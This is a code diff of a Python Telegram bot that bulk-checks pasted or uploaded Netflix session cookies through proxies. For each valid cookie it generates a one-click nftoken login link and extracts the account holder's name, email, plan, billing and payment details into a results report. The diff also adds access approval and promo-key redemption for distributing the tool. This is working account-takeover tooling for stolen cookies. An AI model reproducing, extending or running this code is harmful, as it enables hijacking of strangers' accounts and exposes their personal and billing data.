+            f"Profiles       : {acct.get('profiles', 'Unknown')}",
+            f"💻 Desktop Link : {desktop_link}",
+            f"📱 Phone Link   : {phone_link}",
+            "--------------------------------------------------\n"
+        ])
+    return "\n".join(lines)
+
+# ========== ADMIN & PROMO COMMANDS ==========
 async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id != OWNER_ID:
-        await update.message.reply_text("❌ Only the bot owner can approve users.")
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Owner only command.")
         return
-
     if not context.args:
-        await update.message.reply_text("⚠️ Usage: `/approve <user_id>`", parse_mode="Markdown")
+        await update.message.reply_text("Usage: `/approve <user_id>`", parse_mode="Markdown")
         return
-
     try:
         target_id = int(context.args[0].strip())
-        APPROVED_USERS.add(target_id)
-        await update.message.reply_text(f"✅ User `{target_id}` has been approved to use the bot!", parse_mode="Markdown")
+        db_add_approved_user(target_id)
+        await update.message.reply_text(f"✅ User `{target_id}` permanently approved!", parse_mode="Markdown")
     except ValueError:
-        await update.message.reply_text("❌ Invalid User ID. Please provide a numeric Telegram ID.")
+        await update.message.reply_text("❌ Invalid User ID.")
 
 async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id != OWNER_ID:
-        await update.message.reply_text("❌ Only the bot owner can disapprove users.")
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Owner only command.")
         return
-
     if not context.args:
-        await update.message.reply_text("⚠️ Usage: `/disapprove <user_id>`", parse_mode="Markdown")
+        await update.message.reply_text("Usage: `/disapprove <user_id>`", parse_mode="Markdown")
         return
-
     try:
         target_id = int(context.args[0].strip())
         if target_id == OWNER_ID:
-            await update.message.reply_text("❌ You cannot disapprove the Owner!")
+            await update.message.reply_text("❌ Cannot disapprove Owner!")
             return
-        
-        if target_id in APPROVED_USERS:
-            APPROVED_USERS.remove(target_id)
-            await update.message.reply_text(f"🚫 User `{target_id}` has been removed from approved users.", parse_mode="Markdown")
-        else:
-            await update.message.reply_text("⚠️ User ID is not currently in the approved list.")
+        db_remove_approved_user(target_id)
+        await update.message.reply_text(f"🚫 Revoked access for user `{target_id}`.", parse_mode="Markdown")
     except ValueError:
         await update.message.reply_text("❌ Invalid User ID.")
 
 async def approved_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id != OWNER_ID:
-        await update.message.reply_text("❌ Only the bot owner can view approved users.")
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Owner only command.")
         return
-
     users_text = "\n".join([f"• `{uid}`" for uid in APPROVED_USERS])
     await update.message.reply_text(f"👥 Approved Users List:\n\n{users_text}", parse_mode="Markdown")
 
+async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Owner only command.")
+        return
+    code = context.args[0].strip().upper() if context.args else f"VIP-{uuid.uuid4().hex[:8].upper()}"
+    db_add_promo_key(code)
+    await update.message.reply_text(
+        f"🎟️ **New 24-Hour Key Generated!**\n\n"
+        f"• Code: `{code}`\n"
+        f"• Redeem command: `/redeem {code}`",
+        parse_mode="Markdown"
+    )
 
-# ========== TELEGRAM HANDLER FUNCTIONS ==========
+async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not context.args:
+        await update.message.reply_text("Usage: `/redeem <code>`", parse_mode="Markdown")
+        return
+
+    code = context.args[0].strip().upper()
+    if db_burn_promo_key(code):
+        exp_time = time.time() + (24 * 3600)
+        db_set_temp_access(user_id, exp_time)
+        await update.message.reply_text(
+            f"🎉 **Promo Code Claimed!**\n\n"
+            f"Granted **24-Hour Access** to your account (`{user_id}`).",
+            parse_mode="Markdown"
+        )
+    else:
+        await update.message.reply_text("❌ Invalid or already used promo key.")
+
+# ========== TELEGRAM HANDLERS ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_approved(user_id):
-        await update.message.reply_text(f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nAsk the owner to approve your access.", parse_mode="Markdown")
+        await update.message.reply_text(f"🚫 Access Denied!\nUser ID: `{user_id}`.\nUse `/redeem <code>` or ask owner for access.", parse_mode="Markdown")
         return
-
-    try:
-        logger.info(f"📱 /start from {user_id}")
-        await update.message.reply_text(START_TEXT, parse_mode="Markdown")
-    except Exception as e:
-        logger.error(f"Error in start: {e}")
+    await update.message.reply_text(START_TEXT, parse_mode="Markdown")
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_approved(user_id):
-        await update.message.reply_text(f"🚫 Access Denied! Ask the owner to approve User ID: `{user_id}`", parse_mode="Markdown")
+        await update.message.reply_text(f"🚫 Access Denied! Your ID: `{user_id}`", parse_mode="Markdown")
         return
-
-    try:
-        logger.info(f"❓ /help from {user_id}")
-        await update.message.reply_text(HELP_TEXT)
-    except Exception as e:
-        logger.error(f"Error in help: {e}")
+    await update.message.reply_text(HELP_TEXT)
 
 async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_approved(user_id):
-        await update.message.reply_text(f"🚫 Access Denied! Ask owner for approval. Your ID: `{user_id}`", parse_mode="Markdown")
+        await update.message.reply_text(f"🚫 Access Denied! Your ID: `{user_id}`", parse_mode="Markdown")
         return
-
     global CURRENT_PROXY
     if not context.args:
-        await update.message.reply_text(
-            "⚠️ Please provide a proxy string.\n\n"
-            "Supported Formats:\n"
-            "• `/addproxy host:port`\n"
-            "• `/addproxy user:pass@host:port`\n"
-            "• `/addproxy user:pass:host:port`",
-            parse_mode="Markdown"
-        )
+        await update.message.reply_text("Usage: `/addproxy host:port` or `user:pass@host:port`", parse_mode="Markdown")
         return
 
-    raw_proxy = context.args[0].strip()
-    formatted_proxy = _format_proxy_string(raw_proxy)
-
-    msg = await update.message.reply_text("🔄 Testing proxy connection...", parse_mode="Markdown")
-    
+    formatted_proxy = _format_proxy_string(context.args[0].strip())
+    msg = await update.message.reply_text("🔄 Testing proxy...")
     loop = asyncio.get_running_loop()
     is_live, status_detail = await loop.run_in_executor(None, _is_proxy_live, formatted_proxy)
 
     if is_live:
         CURRENT_PROXY = formatted_proxy
-        await msg.edit_text(
-            f"✅ Proxy Added Successfully!\n\n"
-            f"• Proxy: `{formatted_proxy}`\n"
-            f"• Status: {status_detail}",
-            parse_mode="Markdown"
-        )
+        await msg.edit_text(f"✅ Proxy Set!\n`{formatted_proxy}`\n{status_detail}", parse_mode="Markdown")
     else:
-        await msg.edit_text(
-            f"❌ Proxy Validation Failed!\n\n"
-            f"• Error: {status_detail}\n"
-            f"The proxy was not added.",
-            parse_mode="Markdown"
-        )
+        await msg.edit_text(f"❌ Proxy Failed: {status_detail}")
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_approved(user_id):
-        await update.message.reply_text(f"🚫 Access Denied! Your ID: `{user_id}`", parse_mode="Markdown")
         return
-
     cancel_bulk_event.set()
-    await update.message.reply_text("🛑 **Stop signal set!** The bulk check will halt on the next iteration.")
+    await update.message.reply_text("🛑 Stop signal set! Halting check...")
 
 async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        if not update.message or not update.message.text:
-            return
+    if not update.message or not update.message.text:
+        return
+    cookie_header = _build_cookie_header(update.message.text.strip())
+    if not cookie_header:
+        return
+    user_id = update.effective_user.id
+    if not is_approved(user_id):
+        await update.message.reply_text(f"🚫 Access Denied! ID: `{user_id}`", parse_mode="Markdown")
+        return
+    if not CURRENT_PROXY:
+        await update.message.reply_text("⚠️ Set a proxy first with `/addproxy`", parse_mode="Markdown")
+        return
 
-        cookie_input = update.message.text.strip()
-        
-        # 1. Silently ignore normal group conversation text
-        cookie_header = _build_cookie_header(cookie_input)
-        if not cookie_header:
-            return
+    msg = await update.message.reply_text("🔎 Checking cookie...")
+    loop = asyncio.get_running_loop()
+    ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
 
-        # 2. Enforce access approval only when actual cookie is pasted
-        user_id = update.effective_user.id
-        if not is_approved(user_id):
-            await update.message.reply_text(
-                f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact the owner to grant you access.", 
-                parse_mode="Markdown"
-            )
-            return
+    if ok and nftoken:
+        acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
+        phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
+        desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
 
-        # 3. Proxy requirement check
-        if not CURRENT_PROXY:
-            await update.message.reply_text(
-                "⚠️ **Proxy Required!**\n\n"
-                "You must set a live proxy before checking cookies.\n"
-                "Use `/addproxy` to set one.",
-                parse_mode="Markdown"
-            )
-            return
-
-        logger.info(f"📨 Cookie check request from {user_id}: {len(cookie_input)} chars")
-        preview = _safe_preview_cookie_keys(cookie_header)
-        msg = await update.message.reply_text(f"🔎 Checking Netflix cookies...\n(Keys: {preview})")
-
-        loop = asyncio.get_running_loop()
-        ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
-
-        if ok and nftoken:
-            acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
-
-            phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
-            desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
-
-            formatted_text = (
-                "📁 Source:\n"
-                "pasted_cookie.txt\n"
-                "✅ Status: Valid Premium Account\n\n"
-                "👤 Account Details:\n"
-                f"• Name: {acct.get('name', 'Unknown')}\n"
-                f"• Email: {acct.get('email', 'Unknown')}\n"
-                f"• Country: {acct.get('country', 'Unknown')}\n"
-                f"• Plan: {acct.get('plan', 'Unknown')}\n"
-                f"• Price: {acct.get('plan_price', 'N/A')}\n"
-                f"• Member Since: {acct.get('member_since', 'Unknown')}\n"
-                f"• Next Billing: {acct.get('next_billing', 'Unknown')}\n"
-                f"• Payment: {acct.get('payment_method', 'CC')}\n"
-                f"• Payment Status: {acct.get('payment_status', 'Active / Paid')}\n"
-                f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
-                f"• Quality: {acct.get('video_quality', 'HD')}\n"
-                f"• Streams: {acct.get('max_streams', '2')}\n"
-                f"• Extra Member: {acct.get('extra_member', 'No')}\n"
-                f"• Extra Member Slot: Unknown\n"
-                f"• Email Verified: {acct.get('email_verified', 'No')}\n"
-                f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
-                f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
-                f"• Profiles: {acct.get('profiles', 'Unknown')}"
-            )
-
-            keyboard = [
-                [
-                    InlineKeyboardButton("💻 PC Login", url=desktop_link),
-                    InlineKeyboardButton("📱 Phone Login", url=phone_link)
-                ]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-
-            await msg.edit_text(
-                formatted_text,
-                reply_markup=reply_markup,
-                disable_web_page_preview=True
-            )
-            logger.info(f"✅ Cookie validation successful for {user_id}")
-        else:
-            await msg.edit_text(f"❌ {detail}")
-            logger.warning(f"❌ Cookie validation failed for {user_id}: {detail}")
-    except Exception as e:
-        logger.error(f"Error in handle_cookie_text: {e}", exc_info=True)
+        formatted_text = (
+            f"📁 Source: Pasted Cookie\n✅ Status: Valid Account\n\n"
+            f"👤 Account Details:\n"
+            f"• Name: {acct.get('name')}\n"
+            f"• Email: {acct.get('email')}\n"
+            f"• Country: {acct.get('country')}\n"
+            f"• Plan: {acct.get('plan')}\n"
+            f"• Price: {acct.get('plan_price')}\n"
+            f"• Member Since: {acct.get('member_since')}\n"
+            f"• Next Billing: {acct.get('next_billing')}\n"
+            f"• Payment Status: {acct.get('payment_status')}\n"
+            f"• Profiles: {acct.get('profiles')}"
+        )
+        markup = InlineKeyboardMarkup([[
+            InlineKeyboardButton("💻 PC Login", url=desktop_link),
+            InlineKeyboardButton("📱 Phone Login", url=phone_link)
+        ]])
+        await msg.edit_text(formatted_text, reply_markup=markup)
+    else:
+        await msg.edit_text(f"❌ {detail}")
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
     filename = document.file_name or "document"
-    
-    # 1. Silently ignore non-cookie document uploads (PDFs, Images, MP3s, etc.)
     if not filename.endswith(('.txt', '.zip')):
         return
-
-    # 2. Enforce access control for cookie files
     user_id = update.effective_user.id
     if not is_approved(user_id):
-        await update.message.reply_text(
-            f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact owner for access.", 
-            parse_mode="Markdown"
-        )
+        await update.message.reply_text(f"🚫 Access Denied! ID: `{user_id}`", parse_mode="Markdown")
         return
-
     if not CURRENT_PROXY:
-        await update.message.reply_text(
-            "⚠️ **Proxy Required!**\n\n"
-            "You must set a live proxy before uploading files to check.\n"
-            "Use `/addproxy` to set one.",
-            parse_mode="Markdown"
-        )
+        await update.message.reply_text("⚠️ Set a proxy first with `/addproxy`", parse_mode="Markdown")
         return
 
     cancel_bulk_event.clear()
     status_msg = await update.message.reply_text(f"📥 Downloading `{filename}`...")
-
     temp_dir = tempfile.mkdtemp()
     file_path = os.path.join(temp_dir, filename)
 
     try:
-        tg_file = await context.bot.get_file(document.file_id)
+        tg_file = await context.bot.get_file(document.file_id, read_timeout=60, write_timeout=60)
         await tg_file.download_to_drive(file_path)
 
         raw_files = []
@@ -921,178 +837,79 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 extracted = _split_multiple_cookies(content)
                 fname = os.path.basename(f_path)
                 for idx, c_text in enumerate(extracted, start=1):
-                    tag = f"{fname} (Cookie #{idx})" if len(extracted) > 1 else fname
-                    cookie_queue.append((tag, c_text))
-            except Exception as e:
-                logger.error(f"Error reading {f_path}: {e}")
+                    cookie_queue.append((f"{fname} (#{idx})", c_text))
+            except Exception:
+                pass
 
         total_cookies = len(cookie_queue)
-        valid_count = 0
-        dead_count = 0
-        valid_accounts_list = []  # Store valid account details for .txt report
-        last_update_time = time.time()
-
-        await status_msg.edit_text(
-            f"🔄 Starting Bulk Check...\n\n"
-            f"📦 File: `{filename}`\n"
-            f"📊 Total Cookies: {total_cookies}\n"
-            f"⏳ Progress: 0/{total_cookies} (0%)\n"
-            f"🟢 Valid: 0 | 🔴 Dead: 0\n\n"
-            f"Send /stop to halt anytime.",
-            parse_mode="Markdown"
-        )
-
+        valid_count, dead_count = 0, 0
+        valid_accounts_list = []
         loop = asyncio.get_running_loop()
 
         for idx, (display_name, cookie_raw) in enumerate(cookie_queue, start=1):
-            await asyncio.sleep(0.01)
-
             if cancel_bulk_event.is_set():
-                logger.info("Bulk check cancelled by user via /stop")
                 break
 
-            current_time = time.time()
-            if idx % 3 == 0 or (current_time - last_update_time) > 2.0 or idx == total_cookies:
-                percent = int((idx / total_cookies) * 100)
+            if idx % 3 == 0 or idx == total_cookies:
                 try:
                     await status_msg.edit_text(
                         f"🔄 Checking Cookies...\n\n"
                         f"📦 File: `{filename}`\n"
-                        f"📊 Total: {total_cookies}\n"
-                        f"⏳ Progress: {idx}/{total_cookies} ({percent}%)\n"
-                        f"🟢 Valid: {valid_count} | 🔴 Dead: {dead_count}\n\n"
-                        f"Send /stop to halt anytime.",
+                        f"📊 Progress: {idx}/{total_cookies}\n"
+                        f"🟢 Valid: {valid_count} | 🔴 Dead: {dead_count}",
                         parse_mode="Markdown"
                     )
-                    last_update_time = current_time
                 except Exception:
                     pass
 
-            try:
-                cookie_header = _build_cookie_header(cookie_raw)
-                if not cookie_header:
-                    dead_count += 1
-                    continue
+            cookie_header = _build_cookie_header(cookie_raw)
+            if not cookie_header:
+                dead_count += 1
+                continue
 
-                ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
-
-                if cancel_bulk_event.is_set():
-                    logger.info("Bulk check cancelled post-nftoken via /stop")
-                    break
-
-                if ok and nftoken:
-                    acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
-                    acct["source_tag"] = display_name
-                    acct["nftoken"] = nftoken  # Store nftoken for report links
-
-                    if cancel_bulk_event.is_set():
-                        logger.info("Bulk check cancelled post-account-check via /stop")
-                        break
-
-                    phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
-                    desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
-
-                    formatted_text = (
-                        f"📁 Source:\n{display_name}\n"
-                        f"✅ Status: Valid Premium Account\n\n"
-                        f"👤 Account Details:\n"
-                        f"• Name: {acct.get('name', 'Unknown')}\n"
-                        f"• Email: {acct.get('email', 'Unknown')}\n"
-                        f"• Country: {acct.get('country', 'Unknown')}\n"
-                        f"• Plan: {acct.get('plan', 'Unknown')}\n"
-                        f"• Price: {acct.get('plan_price', 'N/A')}\n"
-                        f"• Member Since: {acct.get('member_since', 'Unknown')}\n"
-                        f"• Next Billing: {acct.get('next_billing', 'Unknown')}\n"
-                        f"• Payment: {acct.get('payment_method', 'CC')}\n"
-                        f"• Payment Status: {acct.get('payment_status', 'Active / Paid')}\n"
-                        f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
-                        f"• Quality: {acct.get('video_quality', 'HD')}\n"
-                        f"• Streams: {acct.get('max_streams', '2')}\n"
-                        f"• Extra Member: {acct.get('extra_member', 'No')}\n"
-                        f"• Extra Member Slot: Unknown\n"
-                        f"• Email Verified: {acct.get('email_verified', 'No')}\n"
-                        f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
-                        f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
-                        f"• Profiles: {acct.get('profiles', 'Unknown')}"
-                    )
-
-                    keyboard = [
-                        [
-                            InlineKeyboardButton("💻 PC Login", url=desktop_link),
-                            InlineKeyboardButton("📱 Phone Login", url=phone_link)
-                        ]
-                    ]
-                    reply_markup = InlineKeyboardMarkup(keyboard)
-
-                    await update.message.reply_text(
-                        formatted_text,
-                        reply_markup=reply_markup,
-                        disable_web_page_preview=True
-                    )
-                    valid_count += 1
-                    valid_accounts_list.append(acct)
-                else:
-                    dead_count += 1
-            except Exception as e:
-                logger.error(f"Error checking {display_name}: {e}")
+            ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
+            if ok and nftoken:
+                acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
+                acct["source_tag"] = display_name
+                acct["nftoken"] = nftoken
+                valid_count += 1
+                valid_accounts_list.append(acct)
+            else:
                 dead_count += 1
 
-        # Final Status Editing & Exporting TXT Report
-        if cancel_bulk_event.is_set():
-            await status_msg.edit_text(
-                f"🛑 **Bulk Check Stopped Manually!**\n\n"
-                f"📊 Final Progress: {idx}/{total_cookies}\n"
-                f"🟢 Valid Found: {valid_count}\n"
-                f"🔴 Dead / Invalid: {dead_count}",
-                parse_mode="Markdown"
-            )
-        else:
-            await status_msg.edit_text(
-                f"✅ **Bulk Check Completed!**\n\n"
-                f"📊 Checked: {total_cookies}/{total_cookies} (100%)\n"
-                f"🟢 Valid Found: {valid_count}\n"
-                f"🔴 Dead / Invalid: {dead_count}",
-                parse_mode="Markdown"
-            )
+        await status_msg.edit_text(
+            f"✅ **Bulk Check Finished!**\n\n"
+            f"📊 Total: {total_cookies}\n"
+            f"🟢 Valid: {valid_count}\n"
+            f"🔴 Dead: {dead_count}",
+            parse_mode="Markdown"
+        )
 
-        # Send TXT file export if valid accounts were found
         if valid_accounts_list:
             report_filename = f"results_{os.path.splitext(filename)[0]}.txt"
             report_path = os.path.join(temp_dir, report_filename)
-            report_content = _generate_results_txt(valid_accounts_list, filename)
-            
             with open(report_path, "w", encoding="utf-8") as rf:
-                rf.write(report_content)
-                
+                rf.write(_generate_results_txt(valid_accounts_list, filename))
             with open(report_path, "rb") as doc_file:
                 await update.message.reply_document(
                     document=doc_file,
                     filename=report_filename,
-                    caption=f"📄 **Results Summary Export**\nFound {len(valid_accounts_list)} valid account(s).",
-                    parse_mode="Markdown"
+                    caption=f"📄 **Results Summary** ({len(valid_accounts_list)} accounts found)"
                 )
-
     except Exception as e:
-        logger.error(f"Error handling document: {e}")
-        await status_msg.edit_text(f"❌ Error processing document: {e}")
+        await status_msg.edit_text(f"❌ Error: {e}")
     finally:
         shutil.rmtree(temp_dir, ignore_errors=True)
 
-
-# ========== MAIN THREAD LOOP ==========
+# ========== MAIN ENTRY POINT ==========
 def run_bot_in_thread():
     global application
-    
     if not BOT_TOKEN:
-        logger.error("❌ BOT_TOKEN not set!")
         return
-    
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-
     try:
         application = ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(True).build()
-        
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
         application.add_handler(CommandHandler("addproxy", addproxy_command))
@@ -1100,42 +917,24 @@ def run_bot_in_thread():
         application.add_handler(CommandHandler("approve", approve_command))
         application.add_handler(CommandHandler("disapprove", disapprove_command))
         application.add_handler(CommandHandler("approved", approved_list_command))
+        application.add_handler(CommandHandler("genkey", genkey_command))
+        application.add_handler(CommandHandler("redeem", redeem_command))
         application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
-        
-        loop.run_until_complete(
-            application.run_polling(
-                allowed_updates=Update.ALL_TYPES,
-                stop_signals=()
-            )
-        )
-    except Exception as e:
-        logger.error(f"❌ Bot runtime error: {e}")
-        application = None
-    finally:
-        try:
-            loop.run_until_complete(loop.shutdown_asyncgens())
-            loop.close()
-        except Exception:
-            pass
 
+        loop.run_until_complete(application.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=()))
+    except Exception as e:
+        logger.error(f"Bot runtime error: {e}")
+    finally:
+        loop.close()
 
 if __name__ == "__main__":
     if not BOT_TOKEN:
-        logger.error("❌ BOT_TOKEN environment variable is not set!")
         sys.exit(1)
-    
     bot_thread = Thread(target=run_bot_in_thread, daemon=True)
     bot_thread.start()
-    
     time.sleep(2)
-    
     try:
-        logger.info(f"🚀 Starting Flask server on port {PORT}\n")
         app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
-    except OSError as e:
-        logger.warning(f"⚠️ Port {PORT} busy ({e}), retrying on fallback port 8080...")
-        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)
     except (KeyboardInterrupt, SystemExit):
-        logger.info("🛑 Shutting down server gracefully...")
         sys.exit(0)
